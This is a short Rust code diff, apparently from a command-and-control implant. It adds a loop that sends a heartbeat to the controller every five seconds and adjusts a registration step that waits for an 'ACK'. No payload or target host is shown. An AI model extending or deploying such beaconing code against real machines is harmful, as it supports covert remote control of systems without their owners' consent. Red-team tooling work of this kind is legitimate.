@@ -22,9 +22,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     register_self(&mut c2com, &identity).await;
 
     // todo: loop waiting for commands from c2
-    // todo: heartbeat loop
-
-    Ok(())
+    
+    loop {
+        c2com.heartbeat(&identity).await;
+        sleep(Duration::from_secs(5)).await;
+    }
 }
 
 async fn register_self(c2com: &mut C2Com, identity: &Identity) {
@@ -40,7 +42,7 @@ async fn register_self(c2com: &mut C2Com, identity: &Identity) {
         }
 
         match c2com::payloads::registration(identity) {
-            Ok(payload) => match c2com.ask(payload).await {
+            Ok(payload) => match c2com.ask(&payload).await {
                 Ok(response) => {
                     if let Some(resp_data) = response
                         && resp_data == b"ACK"
